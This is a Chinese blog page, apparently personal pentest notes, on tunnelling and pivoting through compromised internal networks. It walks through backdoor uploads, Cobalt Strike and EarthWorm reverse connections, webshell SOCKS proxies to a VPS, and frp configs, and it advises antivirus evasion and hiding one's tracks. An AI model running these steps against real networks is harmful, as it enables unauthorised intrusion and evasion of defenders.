@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html>
+  
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  <meta name="author" content="Dong Yuanxin">
+  
+  
+  <title>内网穿透 | hcncn6</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="内网,">
+  
+
+  
+  <meta name="description" content="hcncn小站">
+
+  
+
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.1/dist/av-min.js" async></script>
+  
+
+  
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+  
+
+  
+
+  
+
+  <script>
+  // theme-ad's config script
+  // it can be used in every script
+  
+  window.AD_CONFIG = {
+    leancloud: {"appid":"Hyq9wkH495DgNHWhDQCOfQSp-gzGzoHsz","appkey":"WaR7nrzhliHj9aVwdQzkdlGd","comment":false,"count":true},
+    welcome: {"enable":false,"interval":30},
+    start_time: "2018-11-1",
+    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
+    is_post: true,
+    lock: false,
+    author: "Dong Yuanxin",
+    share: {"twitter":false,"facebook":false,"weibo":false,"qq":false,"wechat":false},
+    mathjax: true,
+    page_type: "",
+    root: "/"
+  };
+</script>
+
+  <script src="/vendor/sha256.min.js"></script>
+<script src="/js/auth.js"></script>
+<script src="/js/index.js"></script>
+<script src="/vendor/qrcode.min.js"></script>
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+  <link rel="stylesheet" href="/css/index.css">
+<link rel="stylesheet" href="/styles/components/highlight/highlight.css">
+
+  
+</head>
+  <body>
+    <header class="site-header">
+  <div class="site-header-brand">
+    
+      <span class="site-header-brand-title">
+        <a href="/">博客0v0</a>
+      </span>
+    
+    
+      <span class="site-header-brand-motto"> | 博客重建中，还有其他细节文章</span>
+    
+  </div>
+  <div class="site-header-right">
+    <nav class="site-header-navigation">
+      
+        <a href="/" target="_self">首页</a>
+      
+        <a href="/archives/" target="_self">归档</a>
+      
+        <a href="/categories/" target="_self">分类</a>
+      
+    </nav>
+    <div class="site-header-btn">
+      
+        <a href="https://github.com/hcncn6" target="_blank" id="site-github">
+          <i class="fa fa-github-alt"></i>
+        </a>
+      
+      <a href="javascript:void(0);" id="site-search">
+        <i class="fa fa-search"></i>
+      </a>
+      <a href="javascript:void(0);" id="site-nav-btn">
+        <i class="fa fa-ellipsis-v"></i>
+      </a>
+    </div>
+  </div>
+</header>
+<nav class="table-content" id="site-nav">
+  <div class="table-content-title">
+    <span>导航</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc">
+      
+        <li class="toc-item">
+          <a href="/" target="_self">
+            首页
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/archives/" target="_self">
+            归档
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/categories/" target="_self">
+            分类
+          </a>
+        </li>
+      
+    </ol>
+  </div>
+</nav>
+<div id="site-process"></div>
+    <main>
+      
+  <div class="passage">
+  <div class="passage-meta">
+    <span>
+      <i class="fa fa-calendar"></i>2022-09-05
+    </span>
+    
+      <span>
+        | <a href="/categories/内网/"><i class="fa fa-bookmark"></i>内网</a>
+      </span>
+    
+    
+      <span>
+        | <i class="fa fa-unlock-alt"></i>UNLOCK
+      </span>
+    
+  </div>
+  <h1 class="passage-title">
+    内网穿透
+  </h1>
+  
+  <article class="passage-article">
+    <p>隧道工具<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   1、网络层隧道工具</span><br><span class="line"></span><br><span class="line">	（1）icmpsh</span><br><span class="line">	（2）icmptunnel</span><br><span class="line">	（3）pingtunnel</span><br><span class="line">2、传输层隧道工具</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">           （1）netcat</span><br><span class="line">           （2）powercat</span><br><span class="line">           （3）socat</span><br><span class="line">           （4）netsh</span><br><span class="line">           （5）lcx</span><br><span class="line">           （6）NATBypass</span><br><span class="line">           （7）iox</span><br><span class="line">           （8）frp</span><br><span class="line"></span><br><span class="line">3、应用层隧道工具</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">           （1）dnscat2</span><br><span class="line">           （2）dnscat2-powershell</span><br><span class="line">           （3）dns2tcp</span><br><span class="line">           （4）iodine</span><br><span class="line">           （5）reGeorg</span><br><span class="line">           （6）Neo-reGeorg</span><br><span class="line">           （7）reDuh</span><br><span class="line">           （8）Tunna</span><br><span class="line">           （9）ABPTTS</span><br><span class="line">           （10）EarthWorm（EW）</span><br><span class="line">           （11）Termite</span><br><span class="line">           （12）Venom</span><br><span class="line">           （13）ssocks</span><br><span class="line">           （14）s5.go</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">内网穿透中的技术要点</span><br><span class="line">	1、进入网络环境后首先确定网络的是否出网，能够出网或者是入网的协议分别有哪些。</span><br><span class="line">	判断主机出网协议方法：</span><br><span class="line">		ICMP：ping        </span><br><span class="line">		DNS：ping，nslookup（WIndows），dig（Linux）        </span><br><span class="line">		HTTP/HTTPS：curl(Linux)，bitsadmin (WIndows)，Certutil (WIndows)，powershell(WIndows)</span><br><span class="line">		不同场景下可以使用的常见内网穿透方案：       </span><br><span class="line">		 只有ICMP出网：icmpsh，icmp直接上线cs，pingtunnel        </span><br><span class="line">		只有DNS出网：DNS-Shell，DNS Beacon上线CS，iodine，dnscat2        </span><br><span class="line">		完全不出网（借助HTTP隧道）：reGeorg，Neo-reGeorg，ABPTTS，不出网上线cs，不出网上线冰蝎        </span><br><span class="line">		目标出网：frp，NPS，EARTH WORM，Venom，icx，MSF、CS直接上线</span><br><span class="line">	3、正向代理操作简单，反向代理操作较复杂，但因为可以结合匿名域名，云函数等手段来提升溯源难度，实战中根据实际情况酌情考虑。</span><br><span class="line">	4、大部分代理工具被杀软所标记，使用时注意免杀与特征的修改.</span><br><span class="line">	6、注意所选工具被发现的难易度</span><br><span class="line">	7、利用系统自带远程工具往往是最优的选择</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">内网穿透</span><br><span class="line">	</span><br><span class="line">利用各种隧道技术，以网络防火墙允许的协议，绕过网络防火墙的封锁，实现访问被封锁的目标网络</span><br><span class="line">需要考虑的点：</span><br><span class="line">    能出网，通过允许的协议或一些旁门</span><br><span class="line">    隐蔽，被发现了那就凉了呀</span><br><span class="line">    稳定，关键时刻不能出问题</span><br><span class="line">    限制少，需要的条件越少越好</span><br><span class="line">    覆盖面广，跟上一条其实有点关联，主要考虑使用场景越多越好</span><br><span class="line"></span><br><span class="line">	分类</span><br><span class="line">		应用层隧道：HTTP隧道、HTTPS隧道、DNS隧道、SSH隧道</span><br><span class="line">		传输层隧道：TCP隧道、UDP隧道</span><br><span class="line">		网络层隧道：ICMP隧道、IPV6隧道、GRE隧道</span><br><span class="line">		SOCKS4只支持TCP应用，而SOCKS5支持TCP和UDP应用。但是由于SOCKS5还支持各种认证机制和域名解析（DNS），SOCKS4不支持，所以出站的SOCKS代理一般是SOCKS4代理。因此，通常不支持UDP应用程序。也就是说，SOCKS5可以支持SOCKS4支持的任何东西，但它与SOCKS4不一样。</span><br><span class="line"></span><br><span class="line">	内网主机所有可能的出网方式</span><br><span class="line"></span><br><span class="line">		1）允许ICMP协议出网</span><br><span class="line">网络防火墙允许ICMP协议出网，即能ping通外网主机，一般都能出网：</span><br><span class="line">		2）允许特定的TCP或UDP协议端口出网</span><br><span class="line">网络防火墙允许特定的TCP或者UDP端口出网，比如连接外网的22、53、80、443、3389等常见应用的默认监听端口。</span><br><span class="line">		3）允许特定的应用层协议出网（比如HTTP、SSH、DNS等应用层协议）</span><br><span class="line">这种网络防火墙能识别应用层的协议，放行允许出网的协议，比如HTTP、SSH、DNS、RDP等应用层协</span><br><span class="line">		隧道</span><br><span class="line">			DNS隧道</span><br><span class="line">原理：配置某个域名的NS服务器，使得对该域名的所有子域解析请求最终到达该NS服务器上，然后将另一个协议的数据编码为一系列DNS查询，响应时客户端将返回的Response数据进行解码得到另一协议的数据</span><br><span class="line">特征：</span><br><span class="line">    DNS隧道建立后依靠不断发送query信息来判断隧道存活性</span><br><span class="line">    通过DNS隧道传输时，客户端将数据编码后作为主机名向DNS服务器提交，DNS服务端解码后读取数据</span><br><span class="line">检测：</span><br><span class="line">    每个IP地址的DNS流量异常，DNS报文数量大</span><br><span class="line">    DNS消息中TXT或NULL等不常用的记录类型多</span><br><span class="line">    DNS消息中域名有部分固定不变</span><br><span class="line">    DNS服务器的地理位置异常</span><br><span class="line">    访问非受信的DNS服务器</span><br><span class="line">    基于请求域名长度及请求频率统计分析方法</span><br><span class="line">    dnscat 查询中包含了dnscat 字符串</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">			HTTP隧道</span><br><span class="line">原理：通过HTTP协议与代理服务器建立连接，协议信令中包含要连接到的远程主机的IP和端口，如果有需要身份验证的话还需要加上授权信息，服务器收到信令后首先进行身份验证，通过后便与远程主机建立连接，连接成功之后会返回给客户端200，表示验证通过。此外HTTP隧道是没有进行加密的，不安全的，一般再嵌套一个SSH安全隧道</span><br><span class="line"></span><br><span class="line">			端口映射和端口转发</span><br><span class="line">端口映射和端口转发其实是一回事，原理是一样的，由于应用场景不同，才产生了不同的含义</span><br><span class="line">			</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">端口映射和转发</span><br><span class="line">	端口映射端口映射就是将主机的内网(LAN)IP地址映射成一个公网(WAN)IP地址，当用户访问提供映射端口主机的某个端口时，服务器将请求转移到本地局域网内部提供这种特定服务的主机，利用端口映射功能还可以将一台外网ip地址机器的多个端口映射到内网不同机器上的不同端口。端口映射和端口转发的区别？这个也是我自己之前比较混淆的一点。虽然两种的功能类似，但又不是完全一样。</span><br><span class="line"></span><br><span class="line">	端口映射是将外网的一个端口完全映射给内网的一个指定端口；</span><br><span class="line">	端口转发是将外网的一个端口的通信完全转发给内网的一个地址的指定端口。端口映射可以实现外网到内网和内网到外网的双向通信</span><br><span class="line">	而映射转发只能实现外网到内网的单向通信。而映射转发只能实现外网到内网的单向通信。</span><br><span class="line">netsh端口映射</span><br><span class="line">	已知B机有WEB服务，端口为80，但是我们kali是直接访问不到的，但是我们拿下了A机器，A可以和B通信，所以我们可以以A为跳板做一个映射，访问到B机。</span><br><span class="line"></span><br><span class="line">	netsh interface portproxy add v4tov4 listenport=7777 connectaddress=10.10.10.128 connectport=80</span><br><span class="line">	有打印机吗？ </span><br><span class="line">1 lpstat -a</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Cobalt strike内网上线</span><br><span class="line">	简介</span><br><span class="line">		内网穿透分为正向和反向，正向可以直接连到内网主机，反向是让受害者反向连接。</span><br><span class="line">		正向代理：已控服务器监听端口，通过这个端口形成一个正向的隧道，由代理机器代替主机去访问内网目标。但是内网入口一般处于DMZ区域有防火墙拦截，无法直接进入内网环境。</span><br><span class="line">		反向代理：由内网主机主动交出权限到代理机器，然后本地去连接形成反向代理。例如：VPS监听本地端口，已控内网服务器来连接此端口，形成一个隧道。如果内网设备连接外网，就无法回弹只能再想其他办法。</span><br><span class="line">	正向</span><br><span class="line">		第一步：CS端生成后门，先上线A主机</span><br><span class="line"></span><br><span class="line">		第二步：生成一个beacon-tcp的监听器，端口随意</span><br><span class="line"></span><br><span class="line">		第三步：生成后门，监听器选择tcp</span><br><span class="line"></span><br><span class="line">		第四步，将后门上传到B主机上，执行</span><br><span class="line"></span><br><span class="line">		第五步：来到A主机的终端，</span><br><span class="line"></span><br><span class="line">		connect B主机ip 端口(刚刚设置的tcp监听器的端口)</span><br><span class="line">		就可以CS正向连接到B主机了，查看ip。</span><br><span class="line"></span><br><span class="line">	反向</span><br><span class="line">		上面是正向代理是不考虑有防火墙拦截的情况，如果在B上有防火墙拦截，那么正向代理就会失败，所以我们这里利用CS的反向连接。反向代理可以突破防火墙的拦截，因为是从服务器内部反向的连接。</span><br><span class="line">所以我们的思路就是在B机器上生成一个后门，让他反向连接到A主机，然后再由A机做一个端口转发，转发到我们的CS机上。</span><br><span class="line">		第一步：先上线A主机，并在A主机上新建监听器</span><br><span class="line">		a代理转发，转发上线</span><br><span class="line">		转发本地4444端口</span><br><span class="line"></span><br><span class="line">		a 生产木马放到b</span><br><span class="line">		在b主机上执行后，后门会主动连接A主机，A机就可以获得B主机的会话了。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Metasploit Portfwd 转发</span><br><span class="line">	我们可以实质上通过本机转发TCP连接</span><br><span class="line"></span><br><span class="line">	拿下B主机，将B主机的8080端口转发到10.10.10.130主机的80端口portfwd add -l 8080 -r 10.10.10.130 -p 80</span><br><span class="line">	远程连接 rdesktop 121212：3389</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Neo-reGeorg-给沃尔 正向</span><br><span class="line">	github：https://github.com/L-codes/Neo-reGeorg</span><br><span class="line">	由于是HTTP，没有加密，所以其实可用的空间不大</span><br><span class="line">	第一步：生成带密码的后门文件</span><br><span class="line">生成一个密码</span><br><span class="line">python3 neoreg.py generate -k password</span><br><span class="line">	第二步：将需要的后门文件上传到B主机的web服务目录下，尝试访问。</span><br><span class="line"></span><br><span class="line">	第三步：继续在kali上操作</span><br><span class="line">python3 neoreg.py -k 密码 -u &quot;我们刚刚上传文件的url地址&quot;</span><br><span class="line">	这里显示已经成功，我们打开浏览器，使用代理插件设置一个socks5的代理。然后我们直接访问10.10.10.130主机的web服务。</span><br><span class="line">	vim /etc/proxychains.conf </span><br><span class="line">	proxychains  nmap 192.168.213.128</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ssh</span><br><span class="line">	SSH本地转发-正向连接</span><br><span class="line">		ssh -L 本地端口:目标ip:目标端口 xxxx@ip -fN</span><br><span class="line">		ssh -L 6666:10.10.10.130:80 用户名@主机的ip -b 的</span><br><span class="line">	SSH远程转发-反向</span><br><span class="line">		远程转发属于反向连接，所以可以穿透内网防火墙，在内网渗透中也比好用。</span><br><span class="line">		实验SSH隧道远程转发</span><br><span class="line">		第一步：修改中间机B的etc/ssh/sshd_config</span><br><span class="line">GatewayPorts yes 有的话no改yes，无的话直接添加</span><br><span class="line">图片</span><br><span class="line">这个配置的作用就是远程转发后将127.0.0.1改为0.0.0.0，A通过指定端口就能访问到C。</span><br><span class="line">记得改为之后重新启动ssh，才能生效。</span><br><span class="line">重启ssh：</span><br><span class="line">sudo /etc/init./ssh restart</span><br><span class="line">		第二步：在C服务器执行转发命令</span><br><span class="line">ssh -R 8877:10.10.10.135:80 m9@10.10.10.131(跳板机的ip，和C同一网段)</span><br><span class="line">		第三步：然后其他和B在同一网段的主机访问到B的ip+8877端口时，就相当于访问了C的80端口，实现了转发。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Earthworm(EW)-应用层</span><br><span class="line">	正向</span><br><span class="line">		第一步：拿下b主机，将EW上传到B主机，执行命令</span><br><span class="line">ew_for_Win.exe -s sscoksd -l 8888</span><br><span class="line">		第二步：修改本地的socks5</span><br><span class="line">sudo vim /etc/proxychains.conf</span><br><span class="line">		proxychains  nmap 192.168.213.128</span><br><span class="line"></span><br><span class="line">	EW反向代理进内网</span><br><span class="line">		操作：</span><br><span class="line">第一步：首先在B主机上执行命令做监听  129</span><br><span class="line">ew_for_Win.exe -s rcsocks -l 1080 -e 1024</span><br><span class="line">		// 在 1.1.1.1 的公网主机添加转接隧道，将 1080 收到的代理请求转交给反连 1024 端口的主机</span><br><span class="line">		然后在C主机上执行，做转发</span><br><span class="line">ew_for_Win.exe -s rssocks -d 10.10.10.129 -e 1024</span><br><span class="line">		将目标网络的可控边界主机反向连接公网主机</span><br><span class="line"></span><br><span class="line">		第二步：在A主机上修改本地Socks5</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ICMP隧道-网络层 </span><br><span class="line">	简介</span><br><span class="line">		ICMP（Internet Control Message Protocol），即Internet控制报文协议，是TCP/IP协议簇的一个子协议</span><br><span class="line"></span><br><span class="line">		由于ICMP报文自身可以携带数据，而且ICMP报文是由系统内核处理的，不占用任何端口，因此具有很高的隐蔽性</span><br><span class="line"></span><br><span class="line">		一些网络环境中，如果不经过认证，TCP和UDP数据包都会拦截，如果用户可以ping通远程主机，就可以尝试ICMP隧道，将TCP数据通过该隧道发送，实现不受限制的网络访问。icmptunnel可以将IP流量装进ICMP的ping数据包中，旨在利用ping穿透防火墙的检测，因为防火墙一般是不会屏蔽ping包的。</span><br><span class="line">切记：这种技术只用于特定结构的网络。</span><br><span class="line"></span><br><span class="line">		虽然A与C之间禁用了TCP，但是我们测试可以ping通，所以可以简单判断防火墙没有对icmp协议进行封禁，所以可以实验icmp隧道技术。</span><br><span class="line"></span><br><span class="line">		（2）优缺点</span><br><span class="line">优点：</span><br><span class="line">    防火墙对ICMP_ECHO数据包是放行的，并且内部主机不会检查ICMP数据包所携带的数据内容，隐蔽性高</span><br><span class="line">缺点：</span><br><span class="line">    ICMP隐蔽传输是无连接的，传输不是很稳定，而且隐蔽通道的带宽很低</span><br><span class="line">    利用隧道传输时，需要接触更低层次的协议 ，这就需要高级用户权限</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">	ptunnel-网络层</span><br><span class="line">		我们需要用到的就是ptunnel工具</span><br><span class="line">在B上执行</span><br><span class="line">ptunnel -x 1234 #1234是密码</span><br><span class="line"></span><br><span class="line">			Pingtunnel基础命令：</span><br><span class="line">-x ：指定ICMP隧道连接的验证密码</span><br><span class="line">-lp：指定要监听的本地TCP端口</span><br><span class="line">-da：指定要转发的目标机器的IP地址</span><br><span class="line">-dp：指定要转发的目标机器的TCP端口</span><br><span class="line">-p：指定ICMP隧道连一段的IP地址</span><br><span class="line">		在A上执行</span><br><span class="line">ptunnel -p 192.168.30.133(B) -lp 8080 -da 192.168.30.132(C) -dp 80 -x 1234</span><br><span class="line">然后我们在A上访问127.0.0.1:8080就能访问到C的80端口。</span><br><span class="line">pingtunne-网络层</span><br><span class="line">	介绍</span><br><span class="line">		github：https://github.com/esrrhs/pingtunnel</span><br><span class="line">持续更新，TCP、UDP、socks5 over ICMP，速度快，连接稳定，跨平台，支持大多数具有libpcap的操作系统，从版本0.7开始，ptunnel也可以在装WinPcap的Windows上编译，client模式不需要管理员权限即可正常使用，推荐使用</span><br><span class="line"></span><br><span class="line">	使用</span><br><span class="line">		echo 1 &gt;/proc/sys/net/ipv4/icmp_echo_ignore_all</span><br><span class="line">建立隧道 可选</span><br><span class="line">		.利用过程：</span><br><span class="line">1.跳板机开启代理服务</span><br><span class="line">pingtunnel  -type server</span><br><span class="line">		2.攻击机进行连接以建立通讯隧道</span><br><span class="line">./pingtunnel -type client –l 攻击机ip:8888 -s 跳板机ip -sock5 1</span><br><span class="line">		3.1linux进行sock5代理配置</span><br><span class="line">		3.2Windows利用SocksCap64进行代理</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">frp-应用层</span><br><span class="line">	简介</span><br><span class="line">		frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网</span><br><span class="line">	模板</span><br><span class="line">	举例</span><br><span class="line">		frps：</span><br><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0  # 服务端监听地址</span><br><span class="line">bind_port = 7000 # 服务端监听端口，默认7000</span><br><span class="line">auth_token = xxxxxxxx # 验证凭据</span><br><span class="line">frpc：</span><br><span class="line">[common]</span><br><span class="line">server_addr = x.x.x.x # 连接的服务器IP地址</span><br><span class="line">server_port = 7000 # 连接的服务器端口</span><br><span class="line">[http_proxy]</span><br><span class="line">type = tcp # 连接类型为tcp</span><br><span class="line">local_ip = x.x.x.x # 本地ip</span><br><span class="line">local_port = 8888 # 本地监听端口</span><br><span class="line">remote_port = 8888 # 远程服务器端口</span><br><span class="line">use_encryption = true #启⽤加密</span><br><span class="line">plugin = socks5  # 使⽤插件socks5代理</span><br><span class="line">		Debian(frpc)：</span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.53.132  </span><br><span class="line">server_port = 7000          </span><br><span class="line">[http_proxy]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 8888</span><br><span class="line">local_ip = 10.10.20.131  </span><br><span class="line">local_port = 8888      </span><br><span class="line">plugin = socks5</span><br><span class="line"></span><br><span class="line">		Debian(frps):</span><br><span class="line">[common]</span><br><span class="line">bind_addr = 10.10.20.131</span><br><span class="line">bind_port = 7000</span><br><span class="line"></span><br><span class="line">		Win 7(frpc):</span><br><span class="line">[common]</span><br><span class="line">server_addr = 10.10.20.131  </span><br><span class="line">server_port = 7000          </span><br><span class="line">[http_proxy]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 10.10.30.130</span><br><span class="line">remote_port = 8888    </span><br><span class="line">local_port = 8888</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ABPTTS-应用层</span><br><span class="line">	github：https://github.com/nccgroup/ABPTTS</span><br><span class="line">TCP over HTTP，即通过HTTP隧道转发TCP连接</span><br><span class="line">    数据加密，可自定义HTTP数据    对抗特征检测十分优秀</span><br><span class="line">    创建的隧道十分稳定    比较遗憾的是支持的web脚本类型只有aspx和jsp</span><br><span class="line">Pystinger</span><br><span class="line">	毒刺（Pystinger）通过webshell搭建内网socks4代理，可用于上线CobaltStrike，此方法适用于目标主机不出网但存在web应用可被互联网访问的情况。</span><br><span class="line"></span><br><span class="line">	可能是因为文件太大，压缩之后还是没法传</span><br><span class="line">这里使用命令行远程Wget来下载到目标服务器上。</span><br><span class="line">	chmod 700 stinger_server </span><br><span class="line"> ./stinger_server 0.0.0.0</span><br><span class="line">	./stinger_client -w http://自己的VPS:7777/proxy.php -l 127.0.0.1 -p 60000</span><br><span class="line">	服务端启动后，在我们的vps上运行客户端即可，w参数指定webshell的地址，l指定监听的地址，p指定监听端口。</span><br><span class="line"></span><br><span class="line">	 </span><br><span 